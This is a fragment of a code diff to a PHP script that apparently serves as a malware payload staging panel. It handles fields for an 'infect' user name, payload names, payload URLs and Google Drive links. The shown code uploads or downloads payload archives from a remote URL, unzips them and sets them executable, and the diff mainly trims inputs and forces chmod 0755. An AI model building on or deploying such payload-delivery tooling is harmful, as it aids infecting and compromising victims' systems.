@@ -46,17 +46,17 @@
     $_SESSION['isValidation']['flag'] = TRUE;
     if($_SERVER['REQUEST_METHOD'] == "POST" && !empty($_SESSION['isValidation']))
     {
-        $sUserName = $_POST['user_name'];
-        $sRepository = $_POST['repository'];
-        $sDeviceAddress = $_POST['device_address'];
+        $sUserName = trim($_POST['user_name']);
+        $sRepository = trim($_POST['repository']);
+        $sDeviceAddress = trim($_POST['device_address']);
         $sFileName = isset($_FILES['upload_file']['name']) ? $_FILES['upload_file']['name']:'';
         $sTempFileName = isset($_FILES['upload_file']['tmp_name'])? $_FILES['upload_file']['tmp_name'] : '';
-        $nPort = $_POST['port_number'];
-        $sInfectUserName = $_POST["infect_user_name"];
-        $sPayloadName = $_POST['payload_name'];
-        $sPayloadUrl = $_POST["payload_url"];
-        $sGooglePayloadName = $_POST['google_payload_name'];
-        $sGoogleDriveLink = $_POST['google_drive_link'];
+        $nPort = trim($_POST['port_number']);
+        $sInfectUserName = trim($_POST["infect_user_name"]);
+        $sPayloadName = trim($_POST['payload_name']);
+        $sPayloadUrl = trim($_POST["payload_url"]);
+        $sGooglePayloadName = trim($_POST['google_payload_name']);
+        $sGoogleDriveLink = trim($_POST['google_drive_link']);
         $sIsAdmin = empty($_POST['check_admin']) ? '' : $_POST['check_admin'];
         $sPayloadSource = isset($_POST['payload_source'])? $_POST['payload_source'] : '';
         $sFolderSource = isset($_POST['folder_source'])? $_POST['folder_source'] : '';
@@ -323,7 +323,7 @@
                             // Move via rename
                             // rename(oldname, newname)
                             if (rename($currentFile , $newFile)) {
-                                (CHMOD == 1) ? chmod($newFile, 0755) : '';
+                                chmod($newFile, 0755);
                                 //if($debug) { echo "<p>Moved $currentFile to $newFile</p>"; }
                             } else {
                                 if($debug) { echo "<p>Failed to move $currentFile to $newFile</p>"; }
@@ -447,7 +447,7 @@
                 $download_unzip_filename = $aExplodeFileName[0];
                 $sListContent = "file_browse;$isAdmin;$download_unzip_filename;$sFileName";
                 move_uploaded_file($sTempFileName, $payload.DIRECTORY_SEPARATOR.$sFileName);
-                (CHMOD == 1) ? chmod($payload.DIRECTORY_SEPARATOR.$sFileName, 0755) : '';
+                chmod($payload.DIRECTORY_SEPARATOR.$sFileName, 0755);
             }
             $zipfile = $payload.DIRECTORY_SEPARATOR.$sDownloadFileName;
 
@@ -564,7 +564,7 @@
                 $copyflag = copy($geturl,$zipfile);
                 
             }
-            (CHMOD == 1) ? chmod($zipfile, 0755) : '';
+            chmod($zipfile, 0755);
             if ($debug) {echo "<h2>Attempting to Unzip</h2><p>Zipped file:  $zipfile </p>";}
             $zipFlag = $zip->open($destination.DIRECTORY_SEPARATOR.$sDownloadFileName,true);
             if ($zipFlag === TRUE) 
